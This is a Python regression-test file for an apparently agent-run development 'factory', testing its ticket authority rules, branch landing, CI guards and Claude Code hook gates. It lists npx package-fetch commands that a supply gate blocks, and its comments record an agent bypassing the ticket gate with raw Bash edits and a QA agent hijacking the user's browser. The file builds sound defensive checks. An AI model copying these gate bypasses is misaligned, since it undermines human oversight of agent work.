#!/usr/bin/env python3
"""Regression tests for the factory's own machinery (not the product).

Run directly: python3 agenticflow/scripts/test_factory.py  (also pytest-compatible).
Seeded 2026-07-13 after a field incident: the receipt gate's prose parser
matched command starters inside ordinary English words ("finish" -> "sh"),
extracting a bogus command that exited 127 and permanently false-REDed a
correct ticket. Every parser fix lands here with the case that forced it.
"""
import json
import os
import re
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import lib_ticket as lib

SUPPLY_GATE = os.path.join(lib.PRODUCT, ".claude", "hooks", "supply_gate.py")
ARTIFACT_GATE = os.path.join(lib.PRODUCT, ".claude", "hooks", "artifact_gate.py")


def _criteria(text):
    return lib.criteria_commands("## Acceptance criteria\n" + text + "\n")


def test_prose_starter_not_matched_inside_words():
    # The incident: "finish" must not yield an "sh ..." command.
    cmds = _criteria(
        "finish yielding ordered phases. cd mobile && npx tsc --noEmit exits 0")
    assert cmds == ["cd mobile && npx tsc --noEmit"], cmds


def test_prose_word_suffixes_never_trigger():
    # cargo/remake/inode end in starter tokens; none may produce a command.
    cmds = _criteria(
        "cargo-culted remake of the inode logic looks right and exits 0")
    assert cmds == [], cmds


def test_prose_real_commands_still_parse():
    cmds = _criteria(
        "pytest tests -q exits 0 and ./run_tests.sh exits 0 and "
        "cd mobile && npx tsc --noEmit exits 0")
    assert cmds == ["pytest tests -q", "./run_tests.sh",
                    "cd mobile && npx tsc --noEmit"], cmds


def test_prose_command_at_line_start_parses():
    cmds = _criteria("node --test tests/reminders.test.ts exits 0")
    assert cmds == ["node --test tests/reminders.test.ts"], cmds


def test_backtick_form_unaffected():
    cmds = _criteria("`.venv/bin/python -m pytest -q` exits 0 and "
                     "`ls -la` is not a runner so it is ignored")
    assert cmds == [".venv/bin/python -m pytest -q"], cmds


def test_dedup_across_forms():
    cmds = _criteria("`./run_tests.sh` exits 0. Also ./run_tests.sh exits 0")
    assert cmds == ["./run_tests.sh"], cmds


def test_negative_and_file_test_criteria_extracted():
    # Field incident (TASK-0024): ACs starting with `!`/`test`/`[`/`grep` were
    # silently dropped, so the receipt went GREEN on the surviving pytest span
    # while the negative grep was in fact failing. All four forms must now be
    # extracted and executed alongside the recognized runners.
    cmds = _criteria(
        "`! grep -qF 'Show fields' app/templates/take.html` exits 0 and\n"
        "`cd app && .venv/bin/python -m pytest -q` exits 0 and\n"
        "`test -f app/static/style.css` exits 0 and\n"
        "`[ -s app/data/quizzes.db ]` exits 0 and\n"
        "`grep -q 'DOCTYPE' app/templates/base.html` exits 0")
    assert cmds == ["! grep -qF 'Show fields' app/templates/take.html",
                    "cd app && .venv/bin/python -m pytest -q",
                    "test -f app/static/style.css",
                    "[ -s app/data/quizzes.db ]",
                    "grep -q 'DOCTYPE' app/templates/base.html"], cmds


def test_backticked_ui_literals_still_ignored():
    # A quoted UI string in criteria prose is not a command — first token
    # outside CMD_STARTERS keeps it skipped even after the negative-AC fix.
    cmds = _criteria('the page never shows `Show fields` or `Answer: []` and '
                     "`pytest app/tests -q` exits 0")
    assert cmds == ["pytest app/tests -q"], cmds


def _gate(command, project):
    payload = json.dumps({"tool_name": "Bash",
                          "tool_input": {"command": command}})
    env = dict(os.environ, CLAUDE_PROJECT_DIR=project)
    return subprocess.run([sys.executable, SUPPLY_GATE], input=payload,
                          capture_output=True, text=True, env=env).returncode


def test_supply_gate_npx_local_bin_semantics():
    # Field incident (Notes run): `npx tsc --noEmit` was blocked although tsc
    # was installed locally and no fetch would occur. The gate now allows npx
    # ONLY for a bare, flag-less (or --no-install) name resolving in the
    # invocation dir's node_modules/.bin; every fetch-implying form still
    # blocks. Running an installed bin adds no capability: the direct
    # ./node_modules/.bin/<x> path was never guarded.
    with tempfile.TemporaryDirectory() as proj:
        for d in ("node_modules/.bin", "mobile/node_modules/.bin"):
            os.makedirs(os.path.join(proj, d))
        open(os.path.join(proj, "node_modules", ".bin", "tsc"), "w").close()
        open(os.path.join(proj, "mobile", "node_modules", ".bin", "tsc"),
             "w").close()
        cases = [
            ("npx tsc --noEmit", 0),               # local bin -> allowed
            ("cd mobile && npx tsc --noEmit", 0),  # resolves in cd'd dir
            ("npx --no-install tsc", 0),           # explicit no-fetch flag
            ("npx eslint .", 2),                   # not installed -> fetch
            ("npx tsc@5.0.0 --noEmit", 2),         # version pin -> fetch
            ("npx -p typescript tsc", 2),          # -p fetches a package
            ("npx -y tsc", 2),                     # unknown flag -> fail closed
            ("cd mobile && cd .. && npx missing", 2),  # LAST cd decides
        ]
        for cmd, want in cases:
            got = _gate(cmd, proj)
            assert got == want, (cmd, got, want)


def test_amend_scope_and_criteria():
    # 2026-07-14 (curator proposal): touch_scope and Acceptance criteria are
    # load-bearing but had no sanctioned amendment path — the architect used
    # raw Bash frontmatter edits (a ticket-gate bypass) on the M3/M4
    # scope-folds. amend-scope/amend-criteria are the legal door; amending
    # criteria must also invalidate any existing receipt (no stale GREEN).
    import types
    import ticket
    with tempfile.TemporaryDirectory() as tmp:
        fake = {"front": {"id": "TASK-9999", "status": "open",
                          "touch_scope": ["app/a.py"]},
                "body": ("## Description\nx\n\n## Acceptance criteria\n"
                         "`pytest -q` exits 0\n\n## History\n- created\n"),
                "path": os.path.join(tmp, "TASK-9999.md")}
        rp = os.path.join(tmp, "TASK-9999.json")
        open(rp, "w").close()
        orig = (ticket.get, ticket.lib.write_ticket, ticket.lib.RECEIPTS)
        try:
            ticket.get = lambda tid: fake
            ticket.lib.write_ticket = lambda t: None
            ticket.lib.RECEIPTS = tmp
            ns = types.SimpleNamespace
            # role gate: builders may not amend either field
            for fn, kw in ((ticket.cmd_amend_scope, {"scope": "app/b.py"}),
                           (ticket.cmd_amend_criteria, {"criteria": "x"})):
                try:
                    fn(ns(id="TASK-9999", as_role="builder-1", note="n", **kw))
                    assert False, "builder amendment must be refused"
                except SystemExit:
                    pass
            ticket.cmd_amend_scope(ns(id="TASK-9999", as_role="architect",
                                      scope="app/a.py, app/tests/test_a.py",
                                      note="fold: tests under-predicted"))
            assert fake["front"]["touch_scope"] == ["app/a.py",
                                                    "app/tests/test_a.py"]
            assert "touch_scope: [app/a.py]" in fake["body"]  # History entry
            ticket.cmd_amend_criteria(ns(id="TASK-9999", as_role="architect",
                                         criteria="`cd app && .venv/bin/python -m pytest -q tests` exits 0",
                                         note="re-bounded"))
            assert "`cd app && .venv/bin/python -m pytest -q tests` exits 0" in fake["body"]
            assert "[was: `pytest -q` exits 0]" in fake["body"]
            assert not os.path.exists(rp), "stale receipt must be deleted"
        finally:
            ticket.get, ticket.lib.write_ticket, ticket.lib.RECEIPTS = orig


def test_ticket_transition_authority():
    # 2026-07-13 fixes: (reopened, done) edge for qa (no-change rulings no
    # longer bounce through a do-nothing builder), and `disputed` is a
    # human-only parking state — wont_fix authority elsewhere must not be
    # the way out of it (the from-state-agnostic bypass).
    import ticket
    assert ticket.transition_allowed("reopened", "done", "qa")
    assert not ticket.transition_allowed("reopened", "done", "builder")
    assert not ticket.transition_allowed("disputed", "wont_fix", "strategist")
    assert not ticket.transition_allowed("disputed", "wont_fix", "toolsmith")
    assert ticket.transition_allowed("disputed", "wont_fix", "human")
    assert ticket.transition_allowed("open", "wont_fix", "strategist")
    assert ticket.transition_allowed("qa", "done", "qa")


def test_human_filed_chain_detection():
    # --human-note gate (BUG-0046: the plain sentence for the human drowned
    # in the QA audit note). The gate keys on discovered_from: inbox:* on the
    # ticket OR any ancestor; the walk must survive a parent cycle.
    import ticket
    mk = lambda tid, parent=None, df=None: {
        "front": {"id": tid, "parent": parent, "discovered_from": df}}
    tickets = {
        "FEAT-1": mk("FEAT-1", df="inbox:2026-07-08-clutter.md"),
        "TASK-2": mk("TASK-2", parent="FEAT-1"),
        "TASK-3": mk("TASK-3"),
        "BUG-4": mk("BUG-4", parent="BUG-5"),
        "BUG-5": mk("BUG-5", parent="BUG-4"),  # cycle: must terminate
    }
    assert ticket.human_filed(tickets["FEAT-1"], tickets)
    assert ticket.human_filed(tickets["TASK-2"], tickets)
    assert not ticket.human_filed(tickets["TASK-3"], tickets)
    assert not ticket.human_filed(tickets["BUG-4"], tickets)


def _factory_repo(tmp):
    """Scratch product repo with the factory installed (scripts copied and
    committed, so worktrees carry them too), one committed product file."""
    import shutil
    af = os.path.join(tmp, "agenticflow")
    os.makedirs(os.path.join(af, "scripts"))
    for d in ("tickets", "archive", "notes", "receipts", "inbox"):
        os.makedirs(os.path.join(af, "tracker", d))
    src = os.path.dirname(os.path.abspath(__file__))
    for n in os.listdir(src):
        if n.endswith(".py"):
            shutil.copy(os.path.join(src, n), os.path.join(af, "scripts", n))
    with open(os.path.join(af, "run.yaml"), "w") as f:
        f.write("builders: 4\nproduct_dir: app\n")
    os.makedirs(os.path.join(tmp, "app"))
    with open(os.path.join(tmp, "app", "main.py"), "w") as f:
        f.write("VALUE = 0\n")
    with open(os.path.join(tmp, ".gitignore"), "w") as f:
        f.write("agenticflow/.worktrees/\nagenticflow/tracker/RUNNING\n"
                "__pycache__/\n")
    for args in (["init", "-q"], ["config", "user.email", "t@t"],
                 ["config", "user.name", "t"], ["add", "-A"],
                 ["commit", "-q", "-m", "init"]):
        subprocess.run(["git", "-C", tmp] + args, check=True,
                       capture_output=True)
    open(os.path.join(af, "tracker", "RUNNING"), "w").close()
    return af


def _run(af, script, *args):
    r = subprocess.run([sys.executable, os.path.join(af, "scripts", script)]
                       + list(args), capture_output=True, text=True)
    assert r.returncode == 0, (script, args, r.stdout, r.stderr)
    return r.stdout


def test_branch_per_ticket_lifecycle():
    # v0.3-A (2026-07-16): scope mutexes are gone — each assigned ticket gets
    # a worktree + branch; builders rebase and hand off; dispatch.py lands
    # mechanically and bounces conflicts back. This walks all four landing
    # outcomes (clean, conflict, uncommitted handoff, nothing-to-land) plus
    # the conflict ticket's second pass through the lane.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        for i in range(4):
            _run(af, "ticket.py", "new", "--type", "TASK", "--title",
                 "t%d" % i, "--as", "architect", "--scope", "app",
                 "--criteria", "`test -f app/main.py` exits 0")
        plan = json.loads(_run(af, "dispatch.py"))
        tids = ["TASK-000%d" % i for i in (1, 2, 3, 4)]
        assert plan["assign_to_builders"] == tids, plan["assign_to_builders"]
        run_branch = plan["run_branch"]
        wts = {t: os.path.join(tmp, plan["worktrees"][t]) for t in tids}
        assert all(os.path.isdir(w) for w in wts.values())

        # a worktree's script copy writes the PRIMARY tracker (lib.ROOT
        # redirects); PRODUCT stays the worktree it physically sits in
        r = subprocess.run(
            [sys.executable, "-c",
             "import sys; sys.path.insert(0, sys.argv[1]); "
             "import lib_ticket as l; print(l.ROOT); print(l.PRODUCT)",
             os.path.join(wts["TASK-0001"], "agenticflow", "scripts")],
            capture_output=True, text=True)
        assert r.stdout.split("\n")[:2] == [af, wts["TASK-0001"]], \
            r.stdout + r.stderr

        def build(tid, path=None, content=None, commit=True):
            _run(af, "ticket.py", "claim", tid, "--as", "builder-1")
            if path:
                with open(os.path.join(wts[tid], path), "w") as f:
                    f.write(content)
            if commit and path:
                for args in (["add", "-A"], ["commit", "-q", "-m", tid]):
                    subprocess.run(["git", "-C", wts[tid]] + args, check=True,
                                   capture_output=True)
            _run(af, "ticket.py", "transition", tid, "built",
                 "--as", "builder-1", "--note", "handoff")

        build("TASK-0001", "app/main.py", "VALUE = 1\n")            # lands
        build("TASK-0002", "app/main.py", "VALUE = 2\n")            # conflicts
        build("TASK-0003", "app/three.py", "x = 3\n", commit=False)  # forgot commit
        build("TASK-0004")                                           # empty

        plan = json.loads(_run(af, "dispatch.py"))
        kinds = {f["id"]: f["kind"] for f in plan["flags"]
                 if f["kind"].startswith("land")}
        assert kinds == {"TASK-0001": "landed", "TASK-0002": "land_conflict",
                         "TASK-0003": "land_uncommitted",
                         "TASK-0004": "land_empty"}, kinds
        assert open(os.path.join(tmp, "app", "main.py")).read() == "VALUE = 1\n"
        # parentless built tickets pool into one batch per tick
        assert plan["qa_batches"] == [["TASK-0001", "TASK-0004"]]
        # bounced tickets keep their worktrees and go straight back to builders
        assert plan["assign_to_builders"] == ["TASK-0002", "TASK-0003"]
        assert os.path.isdir(wts["TASK-0002"]) and os.path.isdir(wts["TASK-0003"])
        assert not os.path.isdir(wts["TASK-0001"]) and not os.path.isdir(wts["TASK-0004"])

        # second pass for the conflicted ticket: rebase, resolve, hand off
        _run(af, "ticket.py", "claim", "TASK-0002", "--as", "builder-2")
        wt2 = wts["TASK-0002"]
        subprocess.run(["git", "-C", wt2, "rebase", run_branch],
                       capture_output=True)  # conflicts, as expected
        with open(os.path.join(wt2, "app", "main.py"), "w") as f:
            f.write("VALUE = 12\n")
        for args in (["add", "-A"],
                     ["-c", "core.editor=true", "rebase", "--continue"]):
            subprocess.run(["git", "-C", wt2] + args, check=True,
                           capture_output=True)
        _run(af, "ticket.py", "transition", "TASK-0002", "built",
             "--as", "builder-2", "--note", "rebased and resolved")
        plan = json.loads(_run(af, "dispatch.py"))
        assert {f["id"]: f["kind"] for f in plan["flags"]
                if f["kind"] == "landed"} == {"TASK-0002": "landed"}
        assert open(os.path.join(tmp, "app", "main.py")).read() == "VALUE = 12\n"
        assert any("TASK-0002" in b for b in plan["qa_batches"])


def test_vision_campaigns():
    # v0.3-E: visions are campaigns — self-contained folders selected by
    # symlinks, so every script keeps its stable paths while ticket ids,
    # docs, and tracker state stay per-campaign (fresh ids per vision was
    # the Notes bug: finance M1 continued the workouts numbering).
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        running = os.path.join(af, "tracker", "RUNNING")
        os.remove(running)  # vision new/switch refuse mid-run
        _run(af, "vision.py", "new", "quiz")
        assert os.path.islink(os.path.join(af, "tracker", "tickets"))
        assert os.path.islink(os.path.join(af, "docs", "vision"))
        # the campaign runs on its own auto-created branch, never on main
        head = lambda: subprocess.run(
            ["git", "-C", tmp, "rev-parse", "--abbrev-ref", "HEAD"],
            capture_output=True, text=True).stdout.strip()
        assert head() == "run/quiz", head()
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "quiz work",
             "--as", "architect", "--criteria", "`test -f app/main.py` exits 0")
        # a second campaign starts its ids back at 0001 and hides the first's
        _run(af, "vision.py", "new", "finance")
        out = _run(af, "ticket.py", "new", "--type", "TASK",
                   "--title", "finance work", "--as", "architect",
                   "--criteria", "`test -f app/main.py` exits 0")
        assert out.strip().endswith("TASK-0001"), out
        assert "finance work" in _run(af, "ticket.py", "show", "TASK-0001")
        # switching back restores the first campaign's state AND branch
        _run(af, "vision.py", "switch", "quiz")
        assert "quiz work" in _run(af, "ticket.py", "show", "TASK-0001")
        assert head() == "run/quiz", head()
        # mid-run switches are refused — storage must not move under a live run
        open(running, "w").close()
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "vision.py"),
                            "switch", "finance"], capture_output=True, text=True)
        assert r.returncode != 0 and "in flight" in r.stderr, (r.stdout, r.stderr)
        os.remove(running)
        # close stamps the campaign; list reports states
        _run(af, "vision.py", "close", "--note", "vision satisfied")
        assert os.path.exists(os.path.join(af, "visions", "quiz", "CLOSED"))
        listing = _run(af, "vision.py", "list")
        assert "CLOSED" in listing and "finance" in listing, listing


def test_vision_amend_strike():
    # Human scalpel for mid-run scope REMOVAL (2026-07-17): strikes preserved
    # under Amendments, reconciliation rides the inbox, wrong text refused.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        os.remove(os.path.join(af, "tracker", "RUNNING"))
        _run(af, "vision.py", "new", "quiz")
        vdir = os.path.join(af, "docs", "vision")
        with open(os.path.join(vdir, "VISION.md"), "w") as f:
            f.write("# V\nTypes: multiple-choice, put-in-order, freeform.\n")
        open(os.path.join(vdir, "VISION.md.frozen"), "w").close()
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "vision.py"),
                            "amend", "--strike", "not-in-the-vision"],
                           capture_output=True, text=True)
        assert r.returncode != 0 and "verbatim" in r.stderr
        _run(af, "vision.py", "amend", "--strike", "put-in-order",
             "--note", "human scope cut")
        text = open(os.path.join(vdir, "VISION.md")).read()
        assert "~~put-in-order~~" in text and "## Amendments (human)" in text
        assert "STRUCK" in text
        notes = [n for n in os.listdir(os.path.join(af, "tracker", "inbox"))
                 if "vision-amendment" in n]
        assert len(notes) == 1
        assert "put-in-order" in open(
            os.path.join(af, "tracker", "inbox", notes[0])).read()


def test_claim_lanes_and_builder_cap():
    # 2026-07-16 defect: architect/designer work had no legal handoff — each
    # doc ticket needed a builder spawn purely to carry it through the gate.
    # They now share the claim/built lane; the builders cap counts builders
    # ONLY; QA still cannot claim.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write("builders: 1\nproduct_dir: app\n")
        for i in range(3):
            _run(af, "ticket.py", "new", "--type", "TASK", "--title",
                 "t%d" % i, "--as", "architect",
                 "--criteria", "`test -f app/main.py` exits 0")
        _run(af, "ticket.py", "claim", "TASK-0001", "--as", "architect")
        # an architect claim does not consume the builder cap
        _run(af, "ticket.py", "claim", "TASK-0002", "--as", "builder-1")
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "ticket.py"),
                            "claim", "TASK-0003", "--as", "builder-2"],
                           capture_output=True, text=True)
        assert r.returncode != 0 and "cap" in (r.stdout + r.stderr)
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "ticket.py"),
                            "claim", "TASK-0003", "--as", "qa"],
                           capture_output=True, text=True)
        assert r.returncode != 0, "QA must never claim"
        _run(af, "ticket.py", "transition", "TASK-0001", "built",
             "--as", "architect", "--note", "doc derivation handed off")


def test_browser_gate_blocks_real_headless():
    # 2026-07-17: a QA render loop ran the human's real Chrome headless —
    # macOS single-instance made their browser unopenable. Real-browser
    # headless launches block; bundled-chromium and plain opens pass.
    gate = os.path.join(lib.PRODUCT, ".claude", "hooks", "browser_gate.py")
    cases = [
        ('"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" '
         '--headless --dump-dom x.html', 2),
        ("open -a 'Google Chrome' https://example.com", 0),
        ("agenticflow/.venv-tools/bin/python walk.py  # chromium.launch()", 0),
        ("'Microsoft Edge' --headless --screenshot page.html", 2),
    ]
    for cmd, want in cases:
        payload = json.dumps({"tool_name": "Bash",
                              "tool_input": {"command": cmd}})
        got = subprocess.run([sys.executable, gate], input=payload,
                             capture_output=True, text=True).returncode
        assert got == want, (cmd, got, want)


def test_vision_merge_gate():
    # v0.3-G: main is human territory. `vision.py merge` is the only door —
    # it runs the FULL suite on the MERGED tree (run branches are verified
    # alone; the merge is the first place their combination exists), stamps
    # CLOSED on green, and on red rolls main back to exactly where it was.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        os.remove(os.path.join(af, "tracker", "RUNNING"))

        def git(*a):
            return subprocess.run(["git", "-C", tmp] + list(a), check=True,
                                  capture_output=True, text=True).stdout.strip()
        default = git("rev-parse", "--abbrev-ref", "HEAD")

        # green path: campaign work, committed, suite passes on merged tree
        _run(af, "vision.py", "new", "ship1")
        with open(os.path.join(tmp, "app", "feature.py"), "w") as f:
            f.write("ok = 1\n")
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write("builders: 1\nproduct_dir: app\n"
                    "ci_command: test -f app/feature.py\n")
        git("add", "-A")
        git("commit", "-q", "-m", "ship1 work")
        out = _run(af, "vision.py", "merge", "--into", default)
        assert "CLOSED" in out and git("rev-parse", "--abbrev-ref", "HEAD") == default
        assert os.path.exists(os.path.join(tmp, "app", "feature.py"))
        assert os.path.exists(os.path.join(af, "visions", "ship1", "CLOSED"))

        # red path: merged suite fails -> full rollback, back on the run branch
        _run(af, "vision.py", "new", "ship2")
        with open(os.path.join(tmp, "app", "bad.py"), "w") as f:
            f.write("bad = 1\n")
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write("builders: 1\nproduct_dir: app\n"
                    "ci_command: ! test -f app/bad.py\n")
        git("add", "-A")
        git("commit", "-q", "-m", "ship2 work")
        before = subprocess.run(["git", "-C", tmp, "rev-parse", default],
                                capture_output=True, text=True).stdout.strip()
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "vision.py"),
                            "merge", "--into", default],
                           capture_output=True, text=True)
        assert r.returncode != 0 and "rolled back" in r.stderr, (r.stdout, r.stderr)
        assert git("rev-parse", default) == before  # main untouched
        assert git("rev-parse", "--abbrev-ref", "HEAD") == "run/ship2"
        assert not os.path.exists(os.path.join(af, "visions", "ship2", "CLOSED"))


def test_ci_check_lock_and_torn_guards():
    # v0.3-B: the dispatcher fires ci_check in the BACKGROUND, so it must
    # refuse to overlap itself (ci_state.json race, double-filed repair BUG)
    # and discard a run whose tree changed mid-suite — filing on a tree that
    # no longer exists is the spurious-P0 class (BUG-0050).
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        # a suite that PASSES but mutates the product tree while running:
        # the post-suite hash differs from the pre-suite one -> torn
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write("builders: 1\nproduct_dir: app\n"
                    "ci_command: python3 -c \"open('app/mid.py','w')"
                    ".write('1')\"\n")
        out = json.loads(_run(af, "ci_check.py"))
        assert out["status"] == "torn", out
        with open(os.path.join(af, "tracker", "ci_state.json")) as f:
            assert json.load(f)["tree_hash"] is None  # stale -> re-checks
        # fresh lockfile = another run in flight -> skip, exit 0
        open(os.path.join(af, "tracker", "ci_check.lock"), "w").close()
        out = json.loads(_run(af, "ci_check.py"))
        assert out["status"] == "locked", out


def test_ui_whoami_and_port_fallback():
    # v0.3-F: run.yaml ui_port is a PREFERENCE decided by identity. Our live
    # UI on the port -> reuse (same pid); another repo's live UI -> never
    # kill, step to the next free port; the actually-bound URL lands in
    # tracker/ui.url. Also proves bgmon registration (via BGMON_REGISTRY).
    import socket
    import urllib.request as rq

    def free_pair():
        for p in range(21870, 21970):
            try:
                for q in (p, p + 1):
                    s = socket.socket()
                    s.bind(("127.0.0.1", q))
                    s.close()
                return p
            except OSError:
                continue
        raise RuntimeError("no free port pair")

    def whoami(port):
        with rq.urlopen("http://127.0.0.1:%d/whoami" % port, timeout=3) as r:
            return json.load(r)

    with tempfile.TemporaryDirectory() as ta, tempfile.TemporaryDirectory() as tb:
        A, B = os.path.realpath(ta), os.path.realpath(tb)
        afa, afb = _factory_repo(A), _factory_repo(B)
        base = free_pair()
        reg = os.path.join(A, "registry.tsv")
        with open(reg, "w") as f:
            f.write("# name\ttype\tkey\tlog\texpect\tnotes\n")
        env = dict(os.environ, BGMON_REGISTRY=reg)
        pids = []
        try:
            def ensure(af, port):
                r = subprocess.run(
                    [sys.executable, os.path.join(af, "scripts", "ui.py"),
                     "--ensure", "--no-browser", "--port", str(port)],
                    capture_output=True, text=True, env=env)
                assert r.returncode == 0, (r.stdout, r.stderr)
                with open(os.path.join(af, "tracker", "ui.url")) as f:
                    return f.read().strip()

            url_a = ensure(afa, base)
            assert url_a.endswith(":%d/" % base), url_a
            info = whoami(base)
            assert info["repo"] == A and info["app"] == "agenticflow-ui"
            pids.append(info["pid"])
            # idempotent: second ensure adopts the same server
            ensure(afa, base)
            assert whoami(base)["pid"] == pids[0]
            # repo B prefers the same port: A's server is NOT killed;
            # B binds the next free port and records it in ITS ui.url
            url_b = ensure(afb, base)
            assert url_b.endswith(":%d/" % (base + 1)), url_b
            info_b = whoami(base + 1)
            assert info_b["repo"] == B
            pids.append(info_b["pid"])
            assert whoami(base)["pid"] == pids[0]  # A untouched
            # bgmon: both servers registered themselves, one row each
            rows = open(reg).read()
            assert "factory-ui-%s" % os.path.basename(A) in rows
            assert "factory-ui-%s" % os.path.basename(B) in rows
        finally:
            for pid in pids:
                try:
                    os.kill(pid, 15)
                except OSError:
                    pass


def test_ui_doc_sections_stay_scoped():
    # The docs page lists only factory-produced-for-human docs. A bare "*.md"
    # sweep leaked every project doc when the factory home was the repo root
    # (Ben, 2026-07-13) — patterns must name files or factory subdirs, and the
    # agent-report dirs humans review must stay covered.
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import ui
    patterns = [p for _, pats in ui.DOC_SECTIONS for p in ui._patterns(pats)]
    for p in patterns:
        assert not p.startswith("*"), "unscoped sweep pattern: %s" % p
        assert ".." not in p and not os.path.isabs(p), "escaping pattern: %s" % p
    for must in ("tracker/evidence", "tracker/digests", "tracker/proposals",
                 "tracker/milestones", "docs/", "DIGEST.md"):
        assert any(must in p for p in patterns), "%s not covered" % must


# --- JS bound (TASK-0032) -------------------------------------------------
# The supply gate hooks package-manager installs; a <script src="https://cdn…">
# or a vendored minified blob is a runtime dependency that never runs one. These
# tests exist because a check that passes vacuously against a clean tree looks
# EXACTLY like a working one — each plants the violation and demands the block.

def _js_scan(files):
    """scan_js_bound over a throwaway product tree. Fixture keys start with
    'app/'; the scope is pinned to ['app'] for the scan so the fixtures work
    identically in every install, whatever the host repo's run.yaml
    product_dir says (Notes' 'mobile' made every fixture invisible)."""
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import self_scan
    with tempfile.TemporaryDirectory() as td:
        for rel, body in files.items():
            full = os.path.join(td, rel)
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "w", encoding="utf-8") as f:
                f.write(body)
        orig = self_scan.lib.default_scope
        self_scan.lib.default_scope = lambda: ["app"]
        try:
            return self_scan.scan_js_bound(td)
        finally:
            self_scan.lib.default_scope = orig


TPL = "app/quizapp/templates/take_question.html"
STATIC = "app/quizapp/static/%s"


def test_js_bound_flags_remote_script_src():
    for src in ('src="https://cdn.example.com/x.js"',
                "src='http://cdn.example.com/x.js'",
                'src="//cdn.example.com/x.js"',          # protocol-relative
                'src = "https://cdn.example.com/x.js"',  # spaced
                'SRC="HTTPS://CDN.EXAMPLE.COM/x.js"'):   # case
        found = _js_scan({TPL: "<html>\n<script %s></script>\n</html>\n" % src})
        assert len(found) == 1, (src, found)
        assert "remote-script-src" in found[0] and TPL in found[0], found
        assert ":2" in found[0], "must name the line: %s" % found[0]


def test_js_bound_passes_same_origin_and_ordinary_links():
    # url_for/relative src is the sanctioned form; an <a href> to the outside
    # world is an ordinary link, not a dependency — flagging it would make the
    # gate noise, and a noisy gate gets ignored.
    assert _js_scan({
        TPL: ('<script src="{{ url_for(\'static\', filename=\'take.js\') }}"'
              ' defer></script>\n'
              '<script src="/static/take.js"></script>\n'
              '<a href="https://example.com/help">help</a>\n'
              '<link rel="stylesheet" href="{{ url_for(\'static\','
              ' filename=\'app.css\') }}">\n'),
        STATIC % "app.css": "a{background:url(\"data:image/svg+xml,"
                            "%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E\")}\n",
    }) == []


def test_js_bound_flags_minified_blob_but_not_handwritten_js():
    blob = _js_scan({STATIC % "htmx.min.js": "var a=1;\n"})
    assert len(blob) == 1 and "minified-js-blob" in blob[0], blob
    assert "htmx.min.js" in blob[0], blob

    long_line = _js_scan({STATIC % "vendored.js":
                          "// ok\n" + "var x=[%s];\n" % ",".join(["1"] * 300)})
    assert len(long_line) == 1 and "minified-js-blob" in long_line[0], long_line
    assert ":2" in long_line[0], "must name the line: %s" % long_line[0]

    # hand-written, unminified, first-party: exactly what the bound ALLOWS
    assert _js_scan({STATIC % "take.js": (
        "// Progressive enhancement: swap the question panel in place.\n"
        "document.addEventListener('DOMContentLoaded', function () {\n"
        "  var form = document.querySelector('form.question');\n"
        "  if (!form) { return; }\n"
        "  form.addEventListener('submit', function (e) { e.preventDefault(); });\n"
        "});\n")}) == []


def test_js_bound_ignores_vendored_and_vcs_dirs():
    # app/.venv ships other people's minified JS (werkzeug's debugger.js) and
    # READMEs full of CDN tags. That is the supply gate's business; if this
    # check tripped on it, every handoff would be red and the gate would be
    # turned off within a day.
    assert _js_scan({
        "app/.venv/lib/python3.9/site-packages/werkzeug/debug/shared/x.min.js":
            "var a=1;",
        "app/node_modules/pkg/dist/bundle.js": "var b=2;" + "x" * 600,
        "app/.git/hooks/sample.html": '<script src="https://cdn.example.com/x.js">',
    }) == []


def _home_repo():
    """True in the kit's home repo (the quiz app). Tests that assert on the
    REAL product tree — its cleanliness or its layout — are home-repo checks;
    a transplanted install's tree hygiene is its own run's business, and the
    unit-level fixtures cover the logic everywhere."""
    return os.path.isdir(os.path.join(lib.PRODUCT, "app", "quizapp"))


def test_js_bound_clean_on_the_real_product_tree():
    # AC4 / the honesty check: the boundary is intact today (zero script tags,
    # zero .js files). If this ever fails, the tree gained a dependency the
    # supply gate never saw — that is the finding, not a test bug.
    if not _home_repo():
        print("    (skipped — real-tree assertion, home repo only)")
        return
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import self_scan
    assert self_scan.scan_js_bound(lib.PRODUCT) == []


def test_js_bound_blocks_a_bare_self_scan_run():
    # End-to-end through the CLI: exit 1 is what ticket.py reads to refuse the
    # claimed→built handoff.
    if not _home_repo():
        print("    (skipped — plants in the real tree, home repo only)")
        return
    scan = os.path.join(os.path.dirname(os.path.abspath(__file__)), "self_scan.py")
    r = subprocess.run([sys.executable, scan], capture_output=True, text=True)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "JS bound clean" in r.stdout, r.stdout

    plant = os.path.join(lib.PRODUCT, "app", "quizapp", "templates",
                         "_task0032_plant.html")
    try:
        with open(plant, "w", encoding="utf-8") as f:
            f.write('<script src="https://cdn.example.com/x.js"></script>\n')
        r = subprocess.run([sys.executable, scan], capture_output=True, text=True)
        assert r.returncode == 1, "planted CDN tag did not block: " + r.stdout
